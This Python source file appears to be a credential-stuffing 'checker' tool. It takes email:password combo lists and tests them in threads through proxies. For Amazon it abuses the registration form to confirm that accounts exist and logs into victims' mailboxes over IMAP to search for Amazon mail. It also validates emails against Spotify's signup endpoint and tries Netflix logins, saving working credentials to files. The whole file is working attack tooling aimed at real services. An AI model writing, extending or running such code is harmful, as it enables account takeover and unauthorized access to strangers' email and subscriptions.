from setting.setting import SAVE_PATH
from termcolor import cprint
from core.helper import check_digit_ret, check_file_or_path, UserAgent, RandomUser, yorn_ret
from pyfiglet import Figlet
from queue import Queue
from setting import CONFIG_PATH
from queue import Queue
from mega import Mega

import imaplib
import socket
import threading
import requests
import re
import os
import concurrent.futures

class HelperChecker:
  '''
  BASE CHECKER HELPER
  '''
  def __init__(self, mail_list="",
    threads=0,
    file_out="",
    invunma=False, proxy=None,
    needimap=False):
    # Loading hoster
    self.mail_list = mail_list # mail_list name file
    self.threads = threads # how much thread 
    self.file_out = file_out # file out
    self.invunma = invunma # if true will write invalid results
    self.proxy = proxy # active modep proxy
    self.valid = Queue() # valid Queue
    if self.invunma:
      self.invalid = Queue() # invalid Queue
    self.empas = Queue() # empas lsit in Queue
    self.class_name = type(self).__name__ # Name of class
    self.clear = 'clear' if os.name == "posix" else "cls" # for clearing terminal
    self.valid_count = 0 # valid count 
    self.invalid_count = 0 # invalid count
    self.count = 0 # counting 

    if needimap: # if need imap this is for amazon checking imap
      cprint("Loading Helper Hoster wait....")

      self.hosters = dict()
      for x in open(CONFIG_PATH + 'hoster.dat', 'r'). readlines():
        x = x.strip().split(":")
        if len(x) > 2:
          self.hosters[x[0]] = (x[1], x[2])

  def get_imap_config(self, x):
    # get hoster config
    try:
      return self.hosters[x]
    except:
      return False

  # def display(self):
  #   os.system(self.clear)
  #   print("""
  #     %s => VALID : %s, DIE : %s, COUNT : %s
  #     """ % (self.class_name, self.valid_count, self.invalid_count, self.count))

  def main(self):
    self.loaders() # calling loaders to load empas and proxy if active and put to self.empas 

    threads = list() # thread list 
    try:
      for _ in range(self.threads):
        th = threading.Thread(target=self.sub_core, daemon=True)
        threads.append(th) # append thread
        th.start() # thread start
      for thread in threads:
        thread.join()

      self.write_valid()
      if self.invunma:
        self.write_invalid()
    except Exception as e:
      print(e)

  def loaders(self):
    with open(self.mail_list, 'r') as f:
      for i in f.readlines():
        i = i.strip().split(":")
        if len(i) == 2:
          if self.mode == 'mega':
            self.empas.append(i)
          else:
            self.empas.put(i)

    if self.proxy:
      tmp = self.proxy
      self.proxy = Queue()
      with open(tmp, 'r') as f:
        for i in f.readlines():
          self.proxy.put(i.strip())

  # Write valid results
  def write_valid(self):
    with open(self.file_out, 'w') as f:
      while not self.valid.empty():
        t = self.valid.get()
        f.write(t+'\n')
  
  # Write invalid results
  def write_invalid(self):
    with open('invalid_'+self.file_out, 'w') as f:
      while not self.invalid.empty():
        t = self.invalid.get()
        f.write(t+'\n')

  # class method asking and return class itself
  @classmethod
  def Asking(cls, what, **args):
    # Class method asking and return the class
    args = args if args else {}
    cprint("Enter your thread : ", 'green', end='')
    args['threads'] = check_digit_ret(input(""))
    cprint("Enter your file out : ", 'green', end='')
    args['file_out'] = input("")
    args['proxy'] = input("Load Proxy (Just enter if you not) :")
    
    if not args['proxy']:
      args['proxy'] = None

    if what == "amz":
      cprint("Do you want to check imap? (y/n) : ", 'green', end='')
      args['check_imap'] = yorn_ret(input(""))
      cprint("Do you want to random UserAgent? (y/n) : ", 'green', end='')
      args['random_ua'] = yorn_ret(input(""))
    
    elif what == "spotify" or what == "netflix" or "mega":
      cprint('Do you want write invalid account ?(y/n) : ', 'green', end='')
      args['invunma'] = yorn_ret(input(""))

    return cls(**args)

class Checkers:
  def __init__(self):
    # First enter mail list name
    cprint("Enter your mail list : ", 'green', end=' ')
    self.mail_list, self.isfile = check_file_or_path(input(""))
    self.__fig = Figlet(font='weird')
    self.__display_banner = lambda x: cprint(self.__fig.renderText(x), 'green')
    self.__curr_tool = None
    self.__display()

  def __display_menu(self):
    self.__display_banner('Checkers')
    cprint('''
      1. Checker Amz
      2. Checker Spotify
      3. Checker Netflix
      4. Back to main menu
      5. Exit
      ''')
    
  def __display(self):
    ask = '1'
    while int(ask) < 4:
      self.__display_menu()
      cprint("Enter your choice : ", 'green', end=' ')
      ask = input("")
      if ask == '1':
        self.__curr_tool = CheckerAmz.Asking('amz', **{'mail_list': self.mail_list})
        self.__curr_tool.main()
      elif ask == '2':
        self.__cur_tool = Spotify.Asking('spotify', **{'mail_list': self.mail_list})
        self.__cur_tool.main()
      elif ask == "3": 
        self.__cur_tool = NetlifChecker.Asking('netflix', **{'mail_list': self.mail_list})
        self.__cur_tool.main()
        
      # non active meganz becuase eat high memory
      # elif ask == "4":
      #   self.__cur_tool = MegaNz.Asking('mega', **{'mail_list': self.mail_list})
      #   self.__cur_tool.main()
      elif ask == "5":
        exit()
      else:
        break

class CheckerAmz(HelperChecker):
  def __init__(self, mail_list="", threads=0, file_out=None, check_imap=False, proxy=None, random_ua=False):
    super().__init__(mail_list=mail_list, threads=threads, file_out=file_out, proxy=proxy, needimap=True)
    self.random_ua = random_ua
    self.link = "https://developer.amazon.com/settings/console/registration?return_to=/"
    if not self.random_ua:
      self.ua = {'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"}
    else:
      self.ua = UserAgent()
    self.check_imap = check_imap
    self.die_write = False
    self.valid_imap = Queue()
    self.info = ['appActionToken', 'siteState', 'openid.return_to', 'prevRID', 'workflowState']
    self.name = "George Rose"

  def core(self, empas):
    sess = requests.Session()
    try:
      header = {'User-Agent': self.ua.random} if self.random_ua else self.ua
      get_redir = sess.get(self.link,
        headers=header,
        allow_redirects=False)

      if 'location' in get_redir.headers:
        redir_uri = get_redir.headers['location'].replace('signin', 'register')
        get_info = sess.get(redir_uri, headers=header)
        data = {
            'appAction': 'REGISTER',
            'claimToken': '',
            'customerName': self.name,
            'email': empas[0],
            'password': "doyouRemember!",
            'passwordCheck': "doyouRemember!",
            'metadata1': 'clairsaddemuneasulahtaigimanasiitunoctruneiliketha'
        }

        for x in self.info:
          txt = '<input type="hidden" name="%s" value="(.*?)"' % x
          data[x] = re.findall(txt, get_info.text)[0]

        resp_post = sess.post(redir_uri, data=data, headers=header, cookies=dict(get_info.cookies))

        if "You indicated you're a new customer, but an account already exists with the email address" in resp_post.text:
          if self.check_imap:
            c = self.imap_amz(empas)
            if c == "AIV" or c == "AI":
              cprint("LIVE IMAP : %s:%s" % (empas[0], empas[1]), 'green')
              self.valid_imap.put(":".join(empas))
          cprint('LIVE : %s:%s' % (empas[0], empas[1]), 'green')
          self.valid.put(":".join(empas))
        else:
          print("DIE : %s:%s" % (empas[0], empas[1]))
          if self.die_write:
            self.invalid.put(":".join(empas))
    except Exception as e:
      print("ERROR ON CORE", e)
      return
    return
  
  def imap_amz(self, empas):
    socket.setdefaulttimeout(10)
    c = "A"
    try:
      host = self.get_imap_config(empas[0].split("@")[1])
      M = imaplib.IMAP4_SSL(host[0], int(host[1]))
      a = str(M.login(empas[0], empas[1]))
      c = ""
      if a[2:4] == "OK":
        M.select('"INBOX"')
        _, data = M.search(None, 'FORM', '"account-update@amazon.com"')
        if data[0]:
          c = "AI"
        else:
          c = "AIV"
      else:
        c = "A"
        
      M.close()
      M.logout()
    except Exception as e:
      return c
    return c
  
  def write_valid(self):
    with open('valid_' + self.file_out, 'w') as f:
      while not self.valid.empty():
        t = self.valid.get()
        f.write(t+"\n")

    if self.valid_imap:
      with open('imap_valid_' + self.file_out, 'w') as f:
        while not self.valid_imap.empty():
          t = self.valid_imap.get()
          f.write(t+"\n")

  def main(self):
    self.loaders()

    while not self.empas.empty():
      multiple_th = list()
      for _ in range(self.threads):
        th = threading.Thread(target=self.core, args=(self.empas.get(), ), daemon=True)
        multiple_th.append(th)
        th.start()
      for thread in multiple_th:
        thread.join()

    self.write_valid()
    if self.die_write:
      self.write_invalid()


class Spotify(HelperChecker):
  URL = "https://www.spotify.com/signup/"
  URL_ENDPOINT = "https://spclient.wg.spotify.com/signup/public/v1/account"

  def __init__(self, mail_list="", threads=0, file_out=None, invunma=False, proxy=None):
    super().__init__(mail_list=mail_list,
                    threads=threads,
                    file_out=file_out,
                    invunma=invunma,
                    proxy=proxy)
    
  def sub_core(self):
    while not self.empas.empty():
      try:
        # self.display()
        proxy = None
        email = self.empas.get()
        if self.proxy:
          if not self.proxy.empty():
            proxy = self.proxy.get()
            r = requests.get(Spotify.URL_ENDPOINT, params={'validate':1, 'email': email[0]}, proxies=proxy)
        else:
          r = requests.get(Spotify.URL_ENDPOINT, params={'validate':1, 'email': email[0]})
        resp_json = r.json()
        if resp_json['status'] == 20:
          print("Valid : %s:%s" % (email[0], email[1]))
          self.valid_count += 1
          self.valid.put(':'.join(email))
        elif resp_json['status'] == 1 and self.invunma:
          print("Invalid : %s:%s" % (email[0], email[1]))
          self.invalid_count += 1
          self.invalid.put(":".join(email))
      except Exception as e:
        print(e)


class NetlifChecker(HelperChecker):
  URL_LOGIN = 'https://www.netflix.com/it/login'

  def __init__(self, mail_list="", threads=0, file_out=None, invunma=False, proxy=None):
    super().__init__(mail_list=mail_list,
                    threads=threads,
                    file_out=file_out,
                    invunma=invunma,
                    proxy=proxy)

  def get_token(self, proxy=None):
    headers = {
      "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
      "Accept-Encoding":"gzip, deflate, sdch, br",
      "Accept-Language":"it-IT,it;q=0.8,en-US;q=0.6,en;q=0.4",
      "Connection":"keep-alive",
      "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"}

    result = requests.get(self.URL_LOGIN, headers=headers) if not proxy else requests.get(self.URL_LOGIN, headers=headers, proxy=proxy)
    res = re.findall('<input type="hidden" name="authURL" value="(.*?)"', result.text)
    if res:
      return res[0]
    else:
      return result.text

  def sub_core(self):
    print('sub_core')
    headers = {
          'Accept-Encoding': 'gzip, deflate, br',
          'Accept-Language': 'it-IT,it;q=0.8,en-US;q=0.6,en;q=0.4',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
          'Content-Type': 'application/x-www-form-urlencoded',
          'Accept': 'application/json, text/plain, */*',
          'Connection': 'keep-alive',
    }
    payload = {
      'rememberMe': 'true',
      'flow': 'websiteSignup',
      'mode': 'login',
      'action': 'loginAction',
      'withFields': 'email,password,rememberMe,nextPage',
      'nextPage': '',
    }
    try:
      email, pw = "", ""
      while not self.empas.empty():
        proxy = None
        self.count += 1
        if self.proxy:
          if not self.proxy.empty():
            proxy = self.proxy.get()
            proxy = {'http':"http://"+proxy}
            token = self.get_token(proxy)
        else:
          token = self.get_token()

        if not email:
          email, pw = self.empas.get()

        if not token:
          print("Blocked by netflix on ", email + ":", pw, "retrying!!")
          continue

        payload['email'] = email
        payload['password'] = pw
        payload['authUrl'] = token
        if proxy:
          login = requests.post(self.URL_LOGIN, headers=headers, data=payload, proxies=proxy)
        else:
          login = requests.post(self.URL_LOGIN, headers=headers, data=payload)

        if login.url == self.URL_LOGIN:
          # self.invalid_count += 1
          print("DIE:", email+":"+pw)
          self.invalid.put(':'.join([email, pw]))
        else:
          if self.invunma:
            print("LIVE:", email+":"+pw)
            # self.valid_count += 1
            self.valid.put(':'.join([email, pw]))
            
        email = ""
    except Exception as e:
      print(e.tracebacks())

# class MegaNz(HelperChecker):
#   def __init__(self, mail_list="", threads=0, file_out=None, invunma=False, proxy=None):
#     super().__init__(mail_list=mail_list,
#                     threads=threads,
#                     file_out=file_out,
#                     invunma=invunma,
#                     proxy=proxy, mode="mega")
#     cprint('\nOnly check email ? : (y/n)','green', end=' ')
#     self.check_only_email = yorn_ret(input(""))
#     self.template = "%s:%s => [%s] , [%2.f MB ,%s MB] , balance = %s"
#     self.template_two = "%s:%s"
#     self.mega = Mega()

#   def sub_core(self, em):
#     try:
#       m = self.mega.login(em[0], em[1])
#       # details = m.get_user()
#       # balance = m.get_balance()
#       # balance = balance[0] if balance else ""
#       # space = m.get_storage_space(mega=True)
#       # if self.check_only_email:
#       print("LIVE :", self.template_two % (em[0], em[1]))
#         self.valid.put(self.template_two % (em[0], em[1]))
#       # else:
#       #   print("LIVE :", self.template % (
#       #         em[0],em[1],
#       #         details['name'],
#       #         space['used'],
#       #         space['total'],
#       #         balance
#       #         ))
#       #   self.valid.put(
#       #     self.template % (
#       #         em[0],em[1],
#       #         details['name'],
#       #         space['used'],
#       #         space['total'],
#       #         balance
#       #         )
#       #     )

#     except Exception as e:
#       if self.invunma:
#         print("DIE :", self.template_two % (em[0], em[1]))
#         self.invalid.put("{}:{}".format(em[0], em[1]))

#   def main(self):
#     self.loaders()
#     while not self.empas.empty():
#       threads = list()
#       for _ in range(self.threads):
#         emp = self.empas.get()
#         x = threading.Thread(target=self.sub_core , args=(emp, ))
#         threads.append(x)
#         x.start()
#       for th in threads:
#         th.join()

#   # def main(self):
#   #   self.loaders()
#   #   with concurrent.futures.ProcessPoolExecutor(max_workers=self.threads) as exc:
#   #   # with concurrent.futures.(max_workers=self.threads) as exc:
#   #     exc_dict = dict()
#   #     # exc.map(self.sub_core, range(self.threads))
#   #     for _ in range(self.threads):
#   #       exc_dict[exc.submit()]

#     print("DONE")
#     self.write_valid()
#     if self.invunma:
#       self.write_invalid()

#     input("")